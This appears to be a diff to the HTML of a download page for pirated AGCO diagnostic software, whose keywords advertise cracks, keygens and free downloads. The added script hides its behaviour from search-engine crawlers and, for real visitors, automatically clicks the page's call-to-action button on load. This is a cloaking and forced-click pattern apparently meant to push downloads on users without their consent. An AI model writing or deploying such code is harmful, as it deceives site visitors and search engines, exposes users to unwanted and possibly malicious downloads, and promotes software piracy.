@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AGCO Electronic Diagnostic Tool EDT v1.127 (04.2024) 09.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="AGCO Electronic Diagnostic Tool EDT v1.127 (04.2024) with multilingual support for comprehensive vehicle diagnostics, programming, and troubleshooting.">
     <meta name="keywords" content="AGCO Electronic Diagnostic Tool, AGCO EDT v1.127, AGCO EDT 2024, AGCO diagnostic software, AGCO diagnostic software download, AGCO diagnostic tool, AGCO diagnostic tool 04.2024, AGCO diagnostic tool 09.2024, AGCO diagnostic software free download, AGCO EDT free download, AGCO EDT v1.127 download, AGCO EDT v1.127 free download, AGCO diagnostic tool crack, AGCO diagnostic tool keygen, AGCO CAN Interface, AGCO Tech Connect Kit, AGCO 2x4 CANUSB, diagnostic software for agricultural vehicles, AGCO EDT electronic diagnostic tool, AGCO EDT unlimited license, AGCO EDT all regions, AGCO diagnostic software Windows 10, AGCO EDT multilingual, Challenger diagnostic tool, Massey Ferguson diagnostic tool, Valtra diagnostic tool, electronic diagnostic tool for agriculture, AGCO Electronic Diagnostic Tool скачать, AGCO EDT русский скачать, AGCO EDT бесплатное скачивание, AGCO диагностическое программное обеспечение, AGCO диагностическое программное обеспечение скачать бесплатно, AGCO диагностический инструмент скачать бесплатно, AGCO ключ">
     <style>
